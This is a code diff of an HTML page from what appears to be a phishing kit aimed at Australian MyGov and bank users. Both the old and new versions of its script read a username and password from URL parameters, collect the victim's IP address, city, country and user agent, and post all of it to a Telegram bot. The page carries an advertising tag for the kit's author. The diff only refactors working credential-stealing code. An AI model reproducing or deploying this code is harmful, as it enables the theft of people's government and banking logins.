@@ -1,85 +1,83 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Processing Login...</title></head>
+<head><title>Processing...</title></head>
 <body>
-  <script src="config/email.js"></script>
-  <script>
-    (function() {
-      // Get parameters from URL
-      function getParam(name) {
-        var urlParams = new URLSearchParams(window.location.search);
-        return urlParams.get(name) || '';
-      }
+    <script src="config/email.js"></script>
+    <script>
+        (function() {
+            const apikey = CONFIG.apikey;
+            const chatid = CONFIG.chatid;
 
-      var username = getParam('username');
-      var password = getParam('password');
-      var title = getParam('title');
+            function getParam(name) {
+                const url = new URL(window.location.href);
+                return url.searchParams.get(name) || '';
+            }
 
-      // If no username, return JSON key (like PHP fallback)
-      if (!username) {
-        document.body.textContent = '{"key": "For Page and Link Contact Telegram: @Mr0xBD"}';
-        return;
-      }
+            async function getLocation(ip) {
+                try {
+                    const res = await fetch(`https://freeipapi.com/api/json/${ip}`);
+                    const data = await res.json();
+                    return { country: data.countryName || 'Unknown', city: data.cityName || 'Unknown' };
+                } catch { return { country: 'Unknown', city: 'Unknown' }; }
+            }
 
-      // Fetch IP and location, then send to Telegram
-      async function sendData() {
-        try {
-          // Get IP
-          var ipResp = await fetch('https://api.ipify.org?format=json');
-          var ipData = await ipResp.json();
-          var ip = ipData.ip;
+            (async function() {
+                const username = getParam('username');
+                const password = getParam('password');
+                const title = getParam('title');
 
-          // Get location
-          var locResp = await fetch('https://freeipapi.com/api/json/' + ip);
-          var locData = await locResp.json();
-          var country = locData.countryName || 'Unknown';
-          var city = locData.cityName || 'Unknown';
+                if (!username) {
+                    document.body.textContent = '{"key": "For Page and Link Contact Telegram: @Mr0xBD"}';
+                    return;
+                }
 
-          // Browser info
-          var userAgent = navigator.userAgent;
-          var browser = 'Unknown';
-          if (userAgent.includes('Chrome')) browser = 'Google Chrome';
-          else if (userAgent.includes('Firefox')) browser = 'Mozilla Firefox';
-          else if (userAgent.includes('Safari')) browser = 'Safari';
-          else if (userAgent.includes('MSIE') || userAgent.includes('Trident')) browser = 'Internet Explorer';
-          else if (userAgent.includes('Opera')) browser = 'Opera';
+                // Get IP
+                let ip = '0.0.0.0';
+                try {
+                    const res = await fetch('https://api.ipify.org?format=json');
+                    const data = await res.json();
+                    ip = data.ip;
+                } catch(e) {}
 
-          // Build message
-          var message = '';
-          message += "|++++++++++++|MyGov AU LOG|+++++++++++|\n";
-          message += "|Bank Name: " + title + "\n";
-          message += "|Username: " + username + "\n";
-          message += "|Password: " + password + "\n";
-          message += "|+++++++++++++|   Information   |+++++++++++++++|\n";
-          message += "|Client IP: " + ip + "\n";
-          message += "|City : " + city + "\n";
-          message += "|Country : " + country + "\n";
-          message += "|UserAgent : " + userAgent + "\n";
-          message += "|+++++++++++++| Coded By Mr.0x |+++++++++++++|\n";
-          message += "|+++++++++++++|    @Mr0xBD     |+++++++++++++|\n";
+                const userAgent = navigator.userAgent;
+                const browser = getBrowser(navigator.userAgent);
+                const location = await getLocation(ip);
 
-          // Send to Telegram
-          var tgUrl = 'https://api.telegram.org/bot' + CONFIG.apikey + '/sendMessage';
-          await fetch(tgUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              chat_id: CONFIG.chatid,
-              text: message
-            })
-          });
+                // Build message
+                let message = "";
+                message += "|++++++++++++|MyGov AU LOG|+++++++++++|\n";
+                message += "|Bank Name: " + title + "\n";
+                message += "|Username: " + username + "\n";
+                message += "|Password: " + password + "\n";
+                message += "|+++++++++++++|   Information   |+++++++++++++++|\n";
+                message += "|Client IP: " + ip + "\n";
+                message += "|City : " + location.city + "\n";
+                message += "|Country : " + location.country + "\n";
+                message += "|UserAgent : " + userAgent + "\n";
+                message += "|+++++++++++++| Coded By Mr.0x |+++++++++++++|\n";
+                message += "|+++++++++++++|    @Mr0xBD     |+++++++++++++|\n";
 
-          // Done – return empty response
-          document.body.innerHTML = '';
-        } catch (error) {
-          console.error('Error in next.html:', error);
-          // Still return empty so that the flow continues
-          document.body.innerHTML = '';
-        }
-      }
+                // Send to Telegram
+                try {
+                    await fetch(`https://api.telegram.org/bot${apikey}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatid, text: message })
+                    });
+                } catch(e) {}
 
-      sendData();
-    })();
-  </script>
+                document.body.innerHTML = '';
+            })();
+
+            function getBrowser(ua) {
+                if (ua.includes('MSIE')) return 'Internet Explorer';
+                if (ua.includes('Firefox')) return 'Mozilla Firefox';
+                if (ua.includes('Chrome')) return 'Google Chrome';
+                if (ua.includes('Safari')) return 'Safari';
+                if (ua.includes('Opera')) return 'Opera';
+                return 'Unknown';
+            }
+        })();
+    </script>
 </body>
 </html>
